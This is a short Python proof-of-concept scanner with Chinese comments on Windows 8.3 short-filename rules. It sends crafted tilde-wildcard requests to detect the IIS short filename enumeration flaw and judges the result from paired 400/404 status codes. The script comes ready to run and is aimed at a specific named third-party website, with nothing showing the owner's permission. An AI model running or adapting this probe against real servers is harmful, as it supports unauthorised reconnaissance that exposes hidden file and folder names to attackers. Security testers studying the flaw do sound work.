import requests

"""
    1.只有前六位字符直接显示，后续字符用~1指代。其中数字1还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）；

    2.后缀名最长只有3位，多余的被截断，超过3位的长文件会生成短文件名；

    3.所有小写字母均转换成大写字母；

    4.长文件名中含有多个“.”，以文件名最后一个“.”作为短文件名后缀；

    5.长文件名前缀/文件夹名字符长度符合0-9和Aa-Zz范围且需要大于等于9位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件；

"""
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
}


def poc(url):
    # print(url)
    url1_400 = "%s/Go0p*~1****/a.aspx" % url
    url1_404 = "%s/*~1****/a.aspx" % url
    url1_300 = "%s/a~1.*" % url
    # print(url1_400)
    try:
        req_400 = requests.get(url1_400, headers=headers, timeout=5)
        # print('400', req_400.status_code)
        req_404 = requests.get(url1_404, headers=headers, timeout=5)
        # req_300 = requests.get(url1_300, headers=headers, timeout=5)
        # print(req_300.status_code)
        # print('404', req_404.status_code)
        if req_400.status_code == 400 and req_404.status_code == 404:
            result = "存在 IIS short filename vuln : %s" % url
            return result
    except:
        pass


if __name__ == "__main__":
    a = poc('http://www.yaoyi021.com')
    print(a)
